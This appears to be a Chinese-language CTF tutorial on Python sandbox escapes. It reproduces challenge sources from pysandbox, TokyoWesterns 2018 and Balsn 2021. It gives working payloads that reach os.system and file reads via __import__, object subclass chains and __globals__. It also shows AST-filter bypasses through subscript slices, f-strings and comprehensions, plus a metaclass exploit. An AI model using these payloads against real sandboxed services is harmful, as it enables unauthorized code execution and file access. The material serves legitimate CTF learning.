---
counter: True
comment: True
---

# Python 沙箱逃逸

## 为什么逃逸？

Python 里的 `eval` 和 `exec` 可以用来执行一些代码来干坏事<br/>
但是题目都会给一些奇奇怪怪的、看起来严密的限制防止干坏事<br/>
这时候就要找方法绕过限制来干坏事，也就是沙箱逃逸

### eval 和 exec 有什么区别

```python
eval(expression[, globals[, locals]])
exec(expression[, globals[, locals]])
```

可以看出它们的用法大体相似，参数有要执行的表达式 `expression`，全局变量 `globals`（必须是字典），局部变量 `locals`（任意 mapping object，一般也是字典）

不同的是 `eval` 把表达式计算出来，把结果返回，并不会影响当前环境<br/>
而 `exec` 把表达式作为py语句来执行，可以进行赋值等操作（题目里 `exec` 不常见）

### eval 和 exec 如何构造沙箱

可以看出，eval 和 exec 都包含参数 globals locals，可以指定它们为空字典使其访问不到全局变量和局部变量

而比较特别的就是 `__builtins__` ，即内置函数。如果 globals 中没有键 __builtins__ ，则会自动将其插入，而看文档 [https://docs.python.org/3/library/functions.html](https://docs.python.org/3/library/functions.html) 可以发现其中有函数 `open` 和 `__import__` 可以用来干坏事，所以一般会传入 globals 为 `{'__builtins__': {}}` 使其无法使用内置函数

### ast.literal_eval

即使 eval 和 exec 给了这样的限制，那肯定还是会有漏洞的（不然就没这篇文章了）<br/>
那有没有更安全的 eval？

`ast` 模块中的 `literal_eval` 就会更加安全，目前貌似并无突破方法，所以题目里是 `ast.literal_eval` 基本上就不是沙箱逃逸了_(:з」∠)_

## 怎么逃逸？

### 仅检查了 expression，但 eval 没有限制

这时只要绕过 expression 的限制就可以了<br/>
比如过滤了 `system、open、ls、cat` 等敏感词<br/>
这样可以用字符串拼接，或者把 bytes decode 成字符串来绕过<br/>
也可以用现有字符串（`?.__doc__`）通过索引来拼接成需要的字符串<br/>
如果是过滤了数字的话则可以用 `True、False` （或 `[]==[]、[]<[]`）来加减乘除开方移位得到数字

### 没有 import

可以用 `__import__` 来手动 import，具体：`__import__(package)`  得到的就是这个package、或者用 `importlib.import_module` 来导入一个包

```python
__import__(os).system("cat flag")
importlib.import_module("os"); os.system("cat flag")
```

### 仅清空了 \_\_builtins\_\_

可以尝试用 `imp.reload` 或 `importlib.reload` 来重新导入 `__builtins__` 

### eval 把环境清空了

#### 找 object 的子类

python 中一切皆对象，可以通过任意东西来找到 object 这个类：

```python
[].__class__.__base__
[].__class__.__bases__[0]
[].__class__.__mro__[-1]
().__class__.__base__
...
{}....
''....
...
```

然后获取它的子类：

```python
[].__class__.__base__.__subclasses__()
```

??? example "subclasses"
    
    ```python
    (0, <class 'type'>)
    (1, <class 'weakref'>)
    (2, <class 'weakcallableproxy'>)
    (3, <class 'weakproxy'>)
    (4, <class 'int'>)
    (5, <class 'bytearray'>)
    (6, <class 'bytes'>)
    (7, <class 'list'>)
    (8, <class 'NoneType'>)
    (9, <class 'NotImplementedType'>)
    (10, <class 'traceback'>)
    (11, <class 'super'>)
    (12, <class 'range'>)
    (13, <class 'dict'>)
    (14, <class 'dict_keys'>)
    (15, <class 'dict_values'>)
    (16, <class 'dict_items'>)
    (17, <class 'dict_reversekeyiterator'>)
    (18, <class 'dict_reversevalueiterator'>)
    (19, <class 'dict_reverseitemiterator'>)
    (20, <class 'odict_iterator'>)
    (21, <class 'set'>)
    (22, <class 'str'>)
    (23, <class 'slice'>)
    (24, <class 'staticmethod'>)
    (25, <class 'complex'>)
    (26, <class 'float'>)
    (27, <class 'frozenset'>)
    (28, <class 'property'>)
    (29, <class 'managedbuffer'>)
    (30, <class 'memoryview'>)
    (31, <class 'tuple'>)
    (32, <class 'enumerate'>)
    (33, <class 'reversed'>)
    (34, <class 'stderrprinter'>)
    (35, <class 'code'>)
    (36, <class 'frame'>)
    (37, <class 'builtin_function_or_method'>)
    (38, <class 'method'>)
    (39, <class 'function'>)
    (40, <class 'mappingproxy'>)
    (41, <class 'generator'>)
    (42, <class 'getset_descriptor'>)
    (43, <class 'wrapper_descriptor'>)
    (44, <class 'method-wrapper'>)
    (45, <class 'ellipsis'>)
    (46, <class 'member_descriptor'>)
    (47, <class 'types.SimpleNamespace'>)
    (48, <class 'PyCapsule'>)
    (49, <class 'longrange_iterator'>)
    (50, <class 'cell'>)
    (51, <class 'instancemethod'>)
    (52, <class 'classmethod_descriptor'>)
    (53, <class 'method_descriptor'>)
    (54, <class 'callable_iterator'>)
    (55, <class 'iterator'>)
    (56, <class 'pickle.PickleBuffer'>)
    (57, <class 'coroutine'>)
    (58, <class 'coroutine_wrapper'>)
    (59, <class 'InterpreterID'>)
    (60, <class 'EncodingMap'>)
    (61, <class 'fieldnameiterator'>)
    (62, <class 'formatteriterator'>)
    (63, <class 'BaseException'>)
    (64, <class 'hamt'>)
    (65, <class 'hamt_array_node'>)
    (66, <class 'hamt_bitmap_node'>)
    (67, <class 'hamt_collision_node'>)
    (68, <class 'keys'>)
    (69, <class 'values'>)
    (70, <class 'items'>)
    (71, <class 'Context'>)
    (72, <class 'ContextVar'>)
    (73, <class 'Token'>)
    (74, <class 'Token.MISSING'>)
    (75, <class 'moduledef'>)
    (76, <class 'module'>)
    (77, <class 'filter'>)
    (78, <class 'map'>)
    (79, <class 'zip'>)
    (80, <class '_frozen_importlib._ModuleLock'>)
    (81, <class '_frozen_importlib._DummyModuleLock'>)
    (82, <class '_frozen_importlib._ModuleLockManager'>)
    (83, <class '_frozen_importlib.ModuleSpec'>)
    (84, <class '_frozen_importlib.BuiltinImporter'>)
    (85, <class 'classmethod'>)
    (86, <class '_frozen_importlib.FrozenImporter'>)
    (87, <class '_frozen_importlib._ImportLockContext'>)
    (88, <class '_thread._localdummy'>)
    (89, <class '_thread._local'>)
    (90, <class '_thread.lock'>)
    (91, <class '_thread.RLock'>)
    (92, <class '_frozen_importlib_external.WindowsRegistryFinder'>)
    (93, <class '_frozen_importlib_external._LoaderBasics'>)
    (94, <class '_frozen_importlib_external.FileLoader'>)
    (95, <class '_frozen_importlib_external._NamespacePath'>)
    (96, <class '_frozen_importlib_external._NamespaceLoader'>)
    (97, <class '_frozen_importlib_external.PathFinder'>)
    (98, <class '_frozen_importlib_external.FileFinder'>)
    (99, <class '_io._IOBase'>)
    (100, <class '_io._BytesIOBuffer'>)
    (101, <class '_io.IncrementalNewlineDecoder'>)
    (102, <class 'posix.ScandirIterator'>)
    (103, <class 'posix.DirEntry'>)
    (104, <class 'zipimport.zipimporter'>)
    (105, <class 'zipimport._ZipImportResourceReader'>)
    (106, <class 'codecs.Codec'>)
    (107, <class 'codecs.IncrementalEncoder'>)
    (108, <class 'codecs.IncrementalDecoder'>)
    (109, <class 'codecs.StreamReaderWriter'>)
    (110, <class 'codecs.StreamRecoder'>)
    (111, <class '_abc_data'>)
    (112, <class 'abc.ABC'>)
    (113, <class 'dict_itemiterator'>)
    (114, <class 'collections.abc.Hashable'>)
    (115, <class 'collections.abc.Awaitable'>)
    (116, <class 'collections.abc.AsyncIterable'>)
    (117, <class 'async_generator'>)
    (118, <class 'collections.abc.Iterable'>)
    (119, <class 'bytes_iterator'>)
    (120, <class 'bytearray_iterator'>)
    (121, <class 'dict_keyiterator'>)
    (122, <class 'dict_valueiterator'>)
    (123, <class 'list_iterator'>)
    (124, <class 'list_reverseiterator'>)
    (125, <class 'range_iterator'>)
    (126, <class 'set_iterator'>)
    (127, <class 'str_iterator'>)
    (128, <class 'tuple_iterator'>)
    (129, <class 'collections.abc.Sized'>)
    (130, <class 'collections.abc.Container'>)
    (131, <class 'collections.abc.Callable'>)
    (132, <class 'os._wrap_close'>)
    (133, <class '_sitebuiltins.Quitter'>)
    (134, <class '_sitebuiltins._Printer'>)
    (135, <class '_sitebuiltins._Helper'>)
    (136, <class 'types.DynamicClassAttribute'>)
    (137, <class 'types._GeneratorWrapper'>)
    (138, <class 'warnings.WarningMessage'>)
    (139, <class 'warnings.catch_warnings'>)
    (140, <class 'importlib.abc.Finder'>)
    (141, <class 'importlib.abc.Loader'>)
    (142, <class 'importlib.abc.ResourceReader'>)
    (143, <class 'operator.itemgetter'>)
    (144, <class 'operator.attrgetter'>)
    (145, <class 'operator.methodcaller'>)
    (146, <class 'itertools.accumulate'>)
    (147, <class 'itertools.combinations'>)
    (148, <class 'itertools.combinations_with_replacement'>)
    (149, <class 'itertools.cycle'>)
    (150, <class 'itertools.dropwhile'>)
    (151, <class 'itertools.takewhile'>)
    (152, <class 'itertools.islice'>)
    (153, <class 'itertools.starmap'>)
    (154, <class 'itertools.chain'>)
    (155, <class 'itertools.compress'>)
    (156, <class 'itertools.filterfalse'>)
    (157, <class 'itertools.count'>)
    (158, <class 'itertools.zip_longest'>)
    (159, <class 'itertools.permutations'>)
    (160, <class 'itertools.product'>)
    (161, <class 'itertools.repeat'>)
    (162, <class 'itertools.groupby'>)
    (163, <class 'itertools._grouper'>)
    (164, <class 'itertools._tee'>)
    (165, <class 'itertools._tee_dataobject'>)
    (166, <class 'reprlib.Repr'>)
    (167, <class 'collections.deque'>)
    (168, <class '_collections._deque_iterator'>)
    (169, <class '_collections._deque_reverse_iterator'>)
    (170, <class '_collections._tuplegetter'>)
    (171, <class 'collections._Link'>)
    (172, <class 'functools.partial'>)
    (173, <class 'functools._lru_cache_wrapper'>)
    (174, <class 'functools.partialmethod'>)
    (175, <class 'functools.singledispatchmethod'>)
    (176, <class 'functools.cached_property'>)
    (177, <class 'contextlib.ContextDecorator'>)
    (178, <class 'contextlib._GeneratorContextManagerBase'>)
    (179, <class 'contextlib._BaseExitStack'>)
    (180, <class 'rlcompleter.Completer'>)
    ```
    

#### 搞事

可以尝试从某些类的 `__init__` 里面搞到 `__globals__` ，比如：

```python
[].__class__.__base__.__subclasses__()[-2].__init__.__globals__['sys'].modules['os'].system("cat flag")
```

也可以利用子类里面的危险类：

```python
(37, <class 'builtin_function_or_method'>)
(94, <class '_frozen_importlib_external.FileLoader'>)
(132, <class 'os._wrap_close'>)
```

比如：

```python
[].__class__.__base__.__subclasses__()[94].get_data("", "flag")
[].__class__.__base__.__subclasses__()[132].close.__globals__["system"]("cat flag")
```

python2 里还有 file 可以直接 open

### 绕过 AST 检测

具体相对复杂，单独列出一条，见下面

## 绕过 AST 检测逃逸

这类题目不像普通的沙箱逃逸一样通过删除内置函数字典或者删除某些模块的内容来实现<br/>
而是在输入命令后即使用python的 ast 模块对其进行语法分析，只要使用了某些禁止的抽象语法，就抛出异常导致程序中断<br/>
因为它直接使用 ast.parse 分析了语法，所以很难蒙混过关骗过 ast，这时就需要寻找题目中遍历语法树的漏洞了

先来看看 cy 的 pysandbox13，这个最终版的 AST 检查绕过

??? question "题目代码"
    ```python 
    dbgprint = sys.stderr.write

    class Traversal():
        def __init__(self, node):
            self.tisiv(node)

        depth = -1
        def tisiv(self, nodes):
            if not isinstance(nodes, list):
                nodes = [nodes]
            self.depth += 1
            for node in nodes:
                func = getattr(self, 'tisiv_' + node.__class__.__name__, None)
                if func:
                    dbgprint(" "*self.depth + "tisiv"[::-1] +"\t"+ node.__class__.__name__+"\n")
                    return func(node)
                else:
                    if not isinstance(node, ast.expr):
                        raise Exception("not allowed "+str(node))
            self.depth -= 1

        def tisiv_Call(self, node):
            raise Exception("not allowed")
            self.tisiv(node.func)
            self.tisiv(node.args)
            self.tisiv(node.keywords)

        def tisiv_Attribute(self, node):
            raise Exception("not allowed")
            self.tisiv(node.value)
            self.tisiv(node.attr)
            self.tisiv(node.ctx)

        def tisiv_Import(self, node):
            raise Exception("not allowed")

        def tisiv_Module(self, node):
            self.tisiv(node.body)

        def tisiv_BoolOp(self, node):
            self.tisiv(node.values)

        def tisiv_BinOp(self, node):
            self.tisiv(node.left)
            self.tisiv(node.right)

        def tisiv_UnaryOp(self, node):
            self.tisiv(node.operand)

        def tisiv_Lambda(self, node):
            self.tisiv(node.body)
            self.tisiv(node.args)

        def tisiv_IfExp(self, node):
            self.tisiv(node.test)
            self.tisiv(node.body)
            self.tisiv(node.orelse)

        def tisiv_Dict(self, node):
            self.tisiv(node.keys)
            self.tisiv(node.values)

        def tisiv_Set(self, node):
            self.tisiv(node.elts)

        def tisiv_ListComp(self, node):
            self.tisiv(node.elt)
            self.tisiv(node.generators)

        def tisiv_SetComp(self, node):
            self.tisiv(node.elt)
            self.tisiv(node.generators)

        def tisiv_DictComp(self, node):
            self.tisiv(node.key)
            self.tisiv(node.value)
            self.tisiv(node.generators)

        def tisiv_GeneratorExp(self, node):
            self.tisiv(node.elt)
            self.tisiv(node.generators)

        def tisiv_Yield(self, node):
            self.tisiv(node.value)

        def tisiv_Compare(self, node):
            self.tisiv(node.left)
            self.tisiv(node.comparators)

        def tisiv_Repr(self, node):
            self.tisiv(node.value)

        def tisiv_Subscript(self, node):
            self.tisiv(node.value)
            self.tisiv(node.slice)

        def tisiv_List(self, node):
            self.tisiv(node.elts)

        def tisiv_Tuple(self, node):
            self.tisiv(node.elts)

        def tisiv_Expr(self, node):
            self.tisiv(node.value)

        def tisiv_JoinedStr(self, node):
            self.tisiv(node.values)

        def tisiv_NameConstant(self, node):
            pass

    Traversal(ast.parse(c))
    ```

可以读出，它定义了一个 Traversal 类，在初始化的时候对传入的节点调用 tisiv 方法，即对其所有子节点继续逐层检查<br/>
如果 tisiv_{该节点类名} 已经有了存在的方法，就调用它，在那些方法中又分别对其子节点进行了检查<br/>
如果不存在这样的方法，就检测这个节点的语法类型是不是 ast.expr，如果不是就直接禁止

再看 TokyoWesterns CTF 4th 2018 的一道题：

??? question "题目代码"
    ```python 
    def check(node):
        if isinstance(node, list):
            return all([check(n) for n in node])
        else:
            attributes = {
                'BoolOp': ['values'],
                'BinOp': ['left', 'right'],
                'UnaryOp': ['operand'],
                'Lambda': ['body'],
                'IfExp': ['test', 'body', 'orelse'],
                'Dict': ['keys', 'values'],
                'Set': ['elts'],
                'ListComp': ['elt', 'generators'],
                'SetComp': ['elt', 'generators'],
                'DictComp': ['key', 'value', 'generators'],
                'GeneratorExp': ['elt', 'generators'],
                'Yield': ['value'],
                'Compare': ['left', 'comparators'],
                'Call': False, # call is not permitted
                'Repr': ['value'],
                'Num': True,
                'Str': True,
                'Attribute': False, # attribute is also not permitted
                'Subscript': ['value'],
                'Name': True,
                'List': ['elts'],
                'Tuple': ['elts'],
                'Expr': ['value'], # root node 
                'comprehension': ['target', 'iter', 'ifs'],
            }

            for k, v in attributes.items():
                if hasattr(ast, k) and isinstance(node, getattr(ast, k)):
                    if isinstance(v, bool):
                        return v
                    return all([check(getattr(node, attr)) for attr in v])

    if __name__ == '__main__':
        expr = sys.stdin.readline()
        body = ast.parse(expr).body
    ```
    
这道题目的代码就更加明确了，道理是类似的

正如前面说的，我们需要找检查程序中的漏洞

### 寻找没有遍历到的子节点
我们发现，在题目的程序中，都是手动编写了对某个抽象语法的哪些部分进行检测，所以可能就会出现某个语法的某个部分没被检测到的情况。

这时候就可以去和 [AST 文档中抽象语法](https://docs.python.org/3/library/ast.html#abstract-grammar) 对比，文档中给出的 ast.expr 包含了：
```Haskell
expr = BoolOp(boolop op, expr* values)
     | NamedExpr(expr target, expr value)
     | BinOp(expr left, operator op, expr right)
     | UnaryOp(unaryop op, expr operand)
     | Lambda(arguments args, expr body)
     | IfExp(expr test, expr body, expr orelse)
     | Dict(expr* keys, expr* values)
     | Set(expr* elts)
     | ListComp(expr elt, comprehension* generators)
     | SetComp(expr elt, comprehension* generators)
     | DictComp(expr key, expr value, comprehension* generators)
     | GeneratorExp(expr elt, comprehension* generators)
     -- the grammar constrains where yield expressions can occur
     | Await(expr value)
     | Yield(expr? value)
     | YieldFrom(expr value)
     -- need sequences for compare to distinguish between
     -- x < 4 < 3 and (x < 4) < 3
     | Compare(expr left, cmpop* ops, expr* comparators)
     | Call(expr func, expr* args, keyword* keywords)
     | FormattedValue(expr value, int? conversion, expr? format_spec)
     | JoinedStr(expr* values)
     | Constant(constant value, string? kind)

     -- the following expression can appear in assignment context
     | Attribute(expr value, identifier attr, expr_context ctx)
     | Subscript(expr value, expr slice, expr_context ctx)
     | Starred(expr value, expr_context ctx)
     | Name(identifier id, expr_context ctx)
     | List(expr* elts, expr_context ctx)
     | Tuple(expr* elts, expr_context ctx)

     -- can appear only in Subscript
     | Slice(expr? lower, expr? upper, expr? step)
```
比如，BinOp(expr left, operator op, expr right) 表示了二元运算这个语法，left 表示左侧的表达式，op 表示二元运算符，right 表示右侧表达式。<br/>
同理 ListComp(expr elt, comprehension* generators) 中 elt 表示其中列表推导的元素，而 generator 则表示生成器子句

再来看 TWCTF 这道题，它的检查中写了：
```python 
'Subscript': ['value'],
```
而文档中给的索引访问是 Subscript(expr value, expr slice, expr_context ctx)

因此可以发现程序并没有检测索引访问中的切片 slice，这样例如 a[...] 中的 ... 部分就会被全部忽略<br/>
所以就可以在[]中藏一个eval执行我们想要的功能

### 寻找没有检查的节点
再来看 zjusec 这道题，通过对比可以发现所有检测的节点的子节点也都遍历了<br/>
但是再细看可以发现 FormattedValue 这个节点并没有在题目代码里出现

而且 ast.FormattedValue 属于 ast.expr，所以它既不会被检查，也不会抛出异常<br/>
看名字像是 f-string 相关，可以 dump 一下看看：
```python 
>>> ast.dump(ast.parse("f'{x}'"))
"""
Module(
  body=[
    Expr(
      value=JoinedStr(
        values=[
          FormattedValue(
            value=Name(id='x', ctx=Load()), 
            conversion=-1, 
            format_spec=None
          )
        ]
        
    )
  ], 
  type_ignores=[]
)
"""
```
可以发现，f-string 是 JoinedStr，而 FormattedValue 是其中被格式化的部分

所以就可以向 f-string 的 {} 部分藏 eval 来干坏事了

### 其他漏洞
这个是 pysandbox12 的一种解法<br/>
python中的语法不仅有 ast.expr 一种，而且很特别的是，列表推导 ListComp 的生成器子句并不是 ast.expr，而是 ast.comprehension
```python 
>>> ast.dump(ast.parse("[x for x in range(n)]"))
"""
Module(
  body=[
    Expr(
      value=ListComp(
        elt=Name(id='x', ctx=Load()), 
        generators=[
          comprehension(
            target=Name(id='x', ctx=Store()), 
            iter=Call(
              func=Name(id='range', ctx=Load()), 
              args=[Name(id='n', ctx=Load())], 
              keywords=[]
            ), 
            ifs=[], 
            is_async=0
          )
        ]
      )
    )
  ], 
  type_ignores=[]
)
"""
```
但是 pysandbox13 这样排除了 ast.expr ：
```python
if not isinstance(node, ast.expr):
    raise Exception("not allowed "+str(node))
```

但是12题中并没有，所以 ast.comprehension 这个类型完全没有被检查<br/>
因此直接向生成器表达式中插入坏东西即可：`[x for x in [eval(...)]]`


## 其他类型的逃逸

具体问题具体分析了

### metaclass
Balsn CTF 2021 出了一道类似沙箱逃逸的题目，主要考察的是 metaclass 
??? question "题目代码"
    ```python 
    class MasterMetaClass(type):   
        def __new__(cls, class_name, class_parents, class_attr):
            def getFlag(self):
                print('Here you go, my master')
                with open('flag') as f:
                    print(f.read())
            class_attr[getFlag.__name__] = getFlag
            attrs = ((name, value) for name, value in class_attr.items() if not name.startswith('__'))
            class_attr = dict(('IWant'+name.upper()+'Plz', value) for name, value in attrs)
            newclass = super().__new__(cls, class_name, class_parents, class_attr)
            return newclass
        def __init__(*argv):
            print('Bad guy! No Flag !!')
            raise 'Illegal'

    class BalsnMetaClass(type):
        def getFlag(self):
            print('You\'re not Master! No Flag !!')

        def __new__(cls, class_name, class_parents, class_attr):
            newclass = super().__new__(cls, class_name, class_parents, class_attr)
            setattr(newclass, cls.getFlag.__name__, cls.getFlag)
            return newclass

    def secure_vars(s):
        attrs = {name:value for name, value in vars(s).items() if not name.startswith('__')}
        return attrs

    safe_dict = {
                'BalsnMetaClass' : BalsnMetaClass,
                'MasterMetaClass' : MasterMetaClass,
                'False' : False,
                'True' : True,
                'abs' : abs,
                'all' : all,
                'any' : any,
                'ascii' : ascii,
                'bin' : bin,
                'bool' : bool,
                'bytearray' : bytearray,
                'bytes' : bytes,
                'chr' : chr,
                'complex' : complex,
                'dict' : dict,
                'dir' : dir,
                'divmod' : divmod,
                'enumerate' : enumerate,
                'filter' : filter,
                'float' : float,
                'format' : format,
                'hash' : hash,
                'help' : help,
                'hex' : hex,
                'id' : id,
                'int' : int,
                'iter' : iter,
                'len' : len,
                'list' : list,
                'map' : map,
                'max' : max,
                'min' : min,
                'next' : next,
                'oct' : oct,
                'ord' : ord,
                'pow' : pow,
                'print' : print,
                'range' : range,
                'reversed' : reversed,
                'round' : round,
                'set' : set,
                'slice' : slice,
                'sorted' : sorted,
                'str' : str,
                'sum' : sum,
                'tuple' : tuple,
                'type' : type,
                'vars' : secure_vars,
                'zip' : zip,
                '__builtins__':None
                }

    def createMethod(code):
        # if len(code) > 45:
        #     print('Too long!! Bad Guy!!')
        #     return
        for x in ' _$#@~':
            code = code.replace(x,'')
        def wrapper(self):
            exec(code, safe_dict, {'self' : self})
        return wrapper

    def setName(pattern):
        while True:
            name = input(f'Give me your {pattern} name :')
            if (name.isalpha()):
                break
            else:
                print('Illegal Name...')
        return name

    def setAttribute(cls):
        attrName = setName('attribute')
        while True:
            attrValue = input(f'Give me your value:')
            if (attrValue.isalnum()):
                break
            else:    
                print('Illegal value...')
        setattr(cls, attrName, attrValue)

    def setMethod(cls):
        methodName = setName('method')
        code = input(f'Give me your function:')       
        func = createMethod(code)
        setattr(cls, methodName, func)

    def getAttribute(obj):
        attrs = [attr for attr in dir(obj) if not callable(getattr(obj, attr)) and not attr.startswith("__")]
        x = input('Please enter the attribute\'s name :')
        if x not in attrs:
            print(f'You can\'t access the attribute {x}')
            return
        else:
            try:
                print(f'{x}: {getattr(obj, x)}')
            except:
                print("Something went wrong in your attribute...")
                return

    def callMethod(cls, obj):
        attrs = [attr for attr in dir(obj) if callable(getattr(obj, attr)) and not attr.startswith("__")]
        x = input('Please enter the method\'s name :')
        if x not in attrs:
            print(f'You can\'t access the method {x}')
            return
        else:
            # try:
            print(f'calling method {x}...')
            cls.__dict__[x](obj)
            print('done')
            # except:
            #     print('Something went wrong in your method...')
            #     return

    class Guest(metaclass = BalsnMetaClass):
        pass

    if __name__ == '__main__':
        print(f'Welcome!!We have prepared a class named "Guest" for you')
        cnt = 0
        while cnt < 3:
            cnt += 1
            print('1. Add attribute')
            print('2. Add method')
            print('3. Finish')
            x = input("Option ? :")
            if x == "1":
                setAttribute(Guest)
            elif x == "2":
                setMethod(Guest)
            elif x == "3":
                break
            else:
                print("invalid input.")
                cnt -= 1
        print("Well Done! We Create an instance for you !")
        obj = Guest()
        cnt = 0
        while cnt < 3:
            cnt += 1
            print('1. Inspect attribute')
            print('2. Using method')
            print('3. Exit')
            x = input("Option ? :")
            if x == "1":
                getAttribute(obj)
            elif x == "2":
                callMethod(Guest, obj)
            elif x == "3":
                print("Okay...exit...")
                break
            else:
                print("invalid input.")
                cnt -= 1
    ```

主要目标是创建一个 MasterMetaClass 的实例但不调用它的 \_\_init\_\_。并且 method method 限制了长度 <=45，而且 '`（空格）_$#@~`' 都会被删掉，内部 exec 的 globals 也给了限制

直接调用 MasterMetaClass 来实例化会执行 \_\_call\_\_ 和 \_\_init\_\_，直接调用 \_\_new\_\_ 又会被限制不能输入下划线

创建一个元类可以使用 `type(name, bases, dict)`，返回值是一个类，参数是：

- `name`: It is a **string** which basically represents the **name of the class**.
- `bases`: It is a **tuple** that specifies the **base classes of the main class**.
- `dict`: It is a ‘**dictionary**‘ that is used to **create body of the class** specified.

所以直接使用 type 创建一个新的 metaclass，让它基于（也就是 bases 参数内容）MasterMetaClass，并且覆盖掉它的 \_\_init\_\_，所以最终的 payload 可以根据这个来改写：

`#!python type("", (MasterMetaClass,), {"__init__":print})("",(),{}).IWantGETFLAGPlz(1)`

因为这时的下划线在引号中，所以可以使用 "\x5f" 来代替

??? success "payload"
    - add method `x`: `#!python e="\x5f"*2;self.d={e+"init"+e:print}`
    - add method `y`: `#!python self.m=type('',(MasterMetaClass,),self.d)`
    - add method `z`: `#!python self.m('',(),{}).IWantGETFLAGPlz(1)`
    - call `x`
    - call `y`
    - call `z`

## Reference
- [TokyoWesterns CTF 4th 2018 Writeup — Part 5](https://infosecwriteups.com/tokyowesterns-ctf-4th-2018-writeup-part-5-6d699f07f71c)
- [Documentation of ast](https://docs.python.org/3/library/ast.html)
- [一文看懂Python沙箱逃逸 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/system/203208.html)
- [https://blog.gztime.cc/posts/2021/83a30666/](https://blog.gztime.cc/posts/2021/83a30666/)